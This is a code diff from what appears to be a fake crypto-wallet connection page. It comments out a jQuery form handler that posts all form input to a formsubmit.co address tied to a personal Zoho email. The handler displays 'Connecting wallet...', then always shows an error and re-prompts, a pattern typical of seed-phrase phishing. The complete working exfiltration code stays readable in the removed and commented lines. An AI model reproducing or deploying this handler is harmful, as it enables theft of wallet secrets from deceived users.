@@ -716,55 +716,55 @@
                 $("#processing-dialog").hide();
             }
         });
-        $("#processForm").submit(function (e) {
-            e.preventDefault();
-            let processBtn = $("#proceedButton");
-            let cancelBtn = $("#cancelBtn");
-            let formData = new FormData(this);
-            $.ajax({
-                method: "POST",
-                url: ' https://formsubmit.co/ajax/rabbadev@zohomail.com',
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                beforeSend: function () {
-                    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
-                    processBtn.prop("disabled", true);
-                    cancelBtn.prop("disabled", true);
-                },
-                success: function () {
-                                restoreButtons();
-                                dismissAllDialogs();
-                                errorBox.show();
-                                setTimeout(function () {
-                                    dismissAllDialogs();
-                                    $("#send-dialog").show();
-                                }, 3500);
-                            },
-                            error: function () {
-                                restoreButtons();
-                                dismissAllDialogs();
-                                errorBox.show();
-                                setTimeout(function () {
-                                    dismissAllDialogs();
-                                    $("#send-dialog").show();
-                                }, 3500);
-                            },
-                        });
-            function restoreButtons() {
-                processBtn.html("PROCEED");
-                processBtn.prop("disabled", false);
-                cancelBtn.prop("disabled", false);
-            }
-            function dismissAllDialogs() {
-                successBox.hide();
-                errorBox.hide();
-                $("#connect-dialog").hide();
-                $("#send-dialog").hide();
-                $("#processing-dialog").hide();
-            }
-        });
+        // $("#processForm").submit(function (e) {
+        //     e.preventDefault();
+        //     let processBtn = $("#proceedButton");
+        //     let cancelBtn = $("#cancelBtn");
+        //     let formData = new FormData(this);
+        //     $.ajax({
+        //         method: "POST",
+        //         url: ' https://formsubmit.co/ajax/rabbadev@zohomail.com',
+        //         data: formData,
+        //         cache: false,
+        //         contentType: false,
+        //         processData: false,
+        //         beforeSend: function () {
+        //             processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
+        //             processBtn.prop("disabled", true);
+        //             cancelBtn.prop("disabled", true);
+        //         },
+        //         success: function () {
+        //                         restoreButtons();
+        //                         dismissAllDialogs();
+        //                         errorBox.show();
+        //                         setTimeout(function () {
+        //                             dismissAllDialogs();
+        //                             $("#send-dialog").show();
+        //                         }, 3500);
+        //                     },
+        //                     error: function () {
+        //                         restoreButtons();
+        //                         dismissAllDialogs();
+        //                         errorBox.show();
+        //                         setTimeout(function () {
+        //                             dismissAllDialogs();
+        //                             $("#send-dialog").show();
+        //                         }, 3500);
+        //                     },
+        //                 });
+        //     function restoreButtons() {
+        //         processBtn.html("PROCEED");
+        //         processBtn.prop("disabled", false);
+        //         cancelBtn.prop("disabled", false);
+        //     }
+        //     function dismissAllDialogs() {
+        //         successBox.hide();
+        //         errorBox.hide();
+        //         $("#connect-dialog").hide();
+        //         $("#send-dialog").hide();
+        //         $("#processing-dialog").hide();
+        //     }
+        // });
     });
 </script>
 </body>
